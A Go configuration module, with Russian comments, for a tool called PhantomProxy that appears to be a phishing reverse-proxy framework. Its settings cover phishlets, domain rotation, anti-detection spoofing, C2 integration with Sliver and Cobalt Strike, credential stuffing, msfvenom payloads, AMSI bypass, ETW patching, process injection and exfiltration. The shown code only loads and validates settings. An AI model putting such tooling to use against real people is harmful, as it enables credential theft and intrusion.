package config

import (
	"fmt"
	"os"
	"strings"

	"github.com/spf13/viper"
)

// Config основная конфигурация PhantomProxy
type Config struct {
	// Сеть
	BindIP      string `mapstructure:"bind_ip"`
	HTTPSPort   int    `mapstructure:"https_port"`
	HTTP3Port   int    `mapstructure:"http3_port"`
	HTTP3Enabled bool  `mapstructure:"http3_enabled"`
	
	// Домен и сертификаты
	Domain           string `mapstructure:"domain"`
	AutoCert         bool   `mapstructure:"auto_cert"`
	CertPath         string `mapstructure:"cert_path"`
	KeyPath          string `mapstructure:"key_path"`
	
	// База данных
	DatabasePath     string `mapstructure:"database_path"`
	DatabaseType     string `mapstructure:"database_type"` // sqlite, postgres
	PostgresURL      string `mapstructure:"postgres_url"`
	RedisURL         string `mapstructure:"redis_url"`
	
	// Phishlets
	PhishletsPath    string `mapstructure:"phishlets_path"`
	
	// Безопасность
	JA3Enabled       bool   `mapstructure:"ja3_enabled"`
	JA3Blocklist     []string `mapstructure:"ja3_blocklist"`
	MLDetection      bool   `mapstructure:"ml_detection"`
	MLThreshold      float32 `mapstructure:"ml_threshold"`
	BlacklistPath    string `mapstructure:"blacklist_path"`
	WhitelistPath    string `mapstructure:"whitelist_path"`
	
	// Polymorphic engine
	PolymorphicEnabled bool   `mapstructure:"polymorphic_enabled"`
	PolymorphicLevel   string `mapstructure:"polymorphic_level"` // low, medium, high
	
	// Service Worker
	ServiceWorkerEnabled bool `mapstructure:"serviceworker_enabled"`
	
	// WebSocket
	WebSocketEnabled bool `mapstructure:"websocket_enabled"`
	
	// Cloudflare Workers
	CloudflareWorkerEnabled bool   `mapstructure:"cloudflare_worker_enabled"`
	CloudflareWorkerURL     string `mapstructure:"cloudflare_worker_url"`
	CloudflareWorkerSecret  string `mapstructure:"cloudflare_worker_secret"`
	
	// Уведомления
	TelegramEnabled bool   `mapstructure:"telegram_enabled"`
	TelegramToken   string `mapstructure:"telegram_token"`
	TelegramChatID  int64  `mapstructure:"telegram_chat_id"`
	
	DiscordEnabled   bool   `mapstructure:"discord_enabled"`
	DiscordWebhookURL string `mapstructure:"discord_webhook_url"`
	
	// API
	APIEnabled bool   `mapstructure:"api_enabled"`
	APIPort    int    `mapstructure:"api_port"`
	APIKey     string `mapstructure:"api_key"`

	// Anti‑detection / fingerprinting
	RandomizeUserAgent bool     `mapstructure:"randomize_user_agent"`
	UserAgents         []string `mapstructure:"user_agents"`
	NormalizeHeaders    bool     `mapstructure:"normalize_headers"`
	CanvasSpoofEnabled bool     `mapstructure:"canvas_spoof_enabled"`
	
	// Логирование
	Debug            bool   `mapstructure:"debug"`
	LogPath          string `mapstructure:"log_path"`
	LogLevel         string `mapstructure:"log_level"`
	
	// Ротация доменов
	DomainRotationEnabled bool     `mapstructure:"domain_rotation_enabled"`
	DomainRotationInterval int     `mapstructure:"domain_rotation_interval"` // минуты
	Domains                []string `mapstructure:"domains"`

	// PhantomProxy v13 modules
	V13 V13Config `mapstructure:"v13"`
}

// V13Config конфигурация модулей v13
type V13Config struct {
	// C2 Integration
	C2 C2Config `mapstructure:"c2"`

	// Credential stuffing
	CredentialStuffing CredentialStuffingConfig `mapstructure:"credential_stuffing"`

	// HIBP (Have I Been Pwned)
	HIBP HIBPConfig `mapstructure:"hibp"`

	// Payload generator
	Payload PayloadConfig `mapstructure:"payload"`

	// Evasion (параметры для внешних инструментов)
	Evasion EvasionConfig `mapstructure:"evasion"`

	// Exfiltration simulation
	Exfiltration ExfilConfig `mapstructure:"exfiltration"`

	// Social engineering
	SocialEngineering SocialEngineeringConfig `mapstructure:"social_engineering"`
}

type C2Config struct {
	Sliver         map[string]interface{} `mapstructure:"sliver"`
	CobaltStrike   map[string]interface{} `mapstructure:"cobalt_strike"`
	Empire         map[string]interface{} `mapstructure:"empire"`
	HTTPCallback   map[string]interface{} `mapstructure:"http_callback"`
	DNSTunnel      map[string]interface{} `mapstructure:"dns_tunnel"`
}

type CredentialStuffingConfig struct {
	Enabled  bool     `mapstructure:"enabled"`
	Targets  []string `mapstructure:"targets"`
	RateLimit int     `mapstructure:"rate_limit"`
}

type HIBPConfig struct {
	Enabled bool   `mapstructure:"enabled"`
	APIKey  string `mapstructure:"api_key"`
}

type PayloadConfig struct {
	Enabled      bool   `mapstructure:"enabled"`
	MsfvenomPath string `mapstructure:"msfvenom_path"`
	OutputDir    string `mapstructure:"output_dir"`
}

type EvasionConfig struct {
	SleepObfuscation bool   `mapstructure:"sleep_obfuscation"`
	SandboxEvasion   bool   `mapstructure:"sandbox_evasion"`
	AMSIBypass       bool   `mapstructure:"amsi_bypass"`
	ETWPatch         bool   `mapstructure:"etw_patch"`
	ProcessInjection string `mapstructure:"process_injection"`
}

type ExfilConfig struct {
	Enabled       bool     `mapstructure:"enabled"`
	TargetTypes   []string `mapstructure:"target_types"`
	MaxSizeMB     int      `mapstructure:"max_size_mb"`
	CloudProvider string   `mapstructure:"cloud_provider"`
}

type SocialEngineeringConfig struct {
	Enabled    bool   `mapstructure:"enabled"`
	SMTPHost   string `mapstructure:"smtp_host"`
	SMTPPort   int    `mapstructure:"smtp_port"`
	RateLimit  int    `mapstructure:"rate_limit"`
}

// Load загружает конфигурацию из файла
func Load(path string) (*Config, error) {
	viper.SetConfigFile(path)
	viper.SetConfigType("yaml")
	
	// Переменные окружения имеют приоритет
	viper.AutomaticEnv()
	viper.SetEnvPrefix("PHANTOM")
	viper.SetEnvKeyReplacer(strings.NewReplacer(".", "_"))
	
	// Значения по умолчанию
	setDefaults()
	
	// Чтение файла
	if err := viper.ReadInConfig(); err != nil {
		if _, ok := err.(viper.ConfigFileNotFoundError); !ok {
			return nil, fmt.Errorf("failed to read config file: %w", err)
		}
		// Файл не найден, используем значения по умолчанию
	}
	
	var cfg Config
	if err := viper.Unmarshal(&cfg); err != nil {
		return nil, fmt.Errorf("failed to unmarshal config: %w", err)
	}
	
	// Валидация
	if err := cfg.Validate(); err != nil {
		return nil, err
	}
	
	return &cfg, nil
}

func setDefaults() {
	viper.SetDefault("bind_ip", "0.0.0.0")
	viper.SetDefault("https_port", 443)
	viper.SetDefault("http3_port", 443)
	viper.SetDefault("http3_enabled", true)
	
	viper.SetDefault("auto_cert", false)
	
	viper.SetDefault("database_path", "./phantom.db")
	viper.SetDefault("database_type", "sqlite")
	
	viper.SetDefault("phishlets_path", "./configs/phishlets")

	// anti‑detection defaults
	viper.SetDefault("randomize_user_agent", false)
	viper.SetDefault("user_agents", []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
	})
	viper.SetDefault("normalize_headers", true)
	
	viper.SetDefault("ja3_enabled", true)
	viper.SetDefault("ml_detection", false)
	viper.SetDefault("ml_threshold", 0.75)
	
	viper.SetDefault("polymorphic_enabled", true)
	viper.SetDefault("polymorphic_level", "high")
	
	viper.SetDefault("serviceworker_enabled", true)
	viper.SetDefault("websocket_enabled", true)
	
	viper.SetDefault("api_enabled", true)
	viper.SetDefault("api_port", 8080)
	
	viper.SetDefault("debug", false)
	viper.SetDefault("log_level", "info")
}

// Validate проверяет корректность конфигурации
func (c *Config) Validate() error {
	if c.Domain == "" {
		return fmt.Errorf("domain is required")
	}
	
	if c.HTTPSPort < 1 || c.HTTPSPort > 65535 {
		return fmt.Errorf("invalid https_port")
	}
	
	if c.PolymorphicLevel != "" && 
	   c.PolymorphicLevel != "low" && 
	   c.PolymorphicLevel != "medium" && 
	   c.PolymorphicLevel != "high" {
		return fmt.Errorf("invalid polymorphic_level: must be low, medium, or high")
	}
	
	if c.DatabaseType != "sqlite" && c.DatabaseType != "postgres" {
		return fmt.Errorf("invalid database_type: must be sqlite or postgres")
	}
	
	if c.DatabaseType == "postgres" && c.PostgresURL == "" {
		return fmt.Errorf("postgres_url is required when database_type is postgres")
	}
	
	return nil
}

// Save сохраняет конфигурацию в файл
func (c *Config) Save(path string) error {
	viper.Set("bind_ip", c.BindIP)
	viper.Set("https_port", c.HTTPSPort)
	viper.Set("domain", c.Domain)
	viper.Set("database_path", c.DatabasePath)
	viper.Set("phishlets_path", c.PhishletsPath)
	viper.Set("polymorphic_level", c.PolymorphicLevel)
	viper.Set("debug", c.Debug)
	
	return viper.WriteConfigAs(path)
}

// GetEnv возвращает значение переменной окружения или значение по умолчанию
func GetEnv(key, defaultValue string) string {
	if value, exists := os.LookupEnv(key); exists {
		return value
	}
	return defaultValue
}
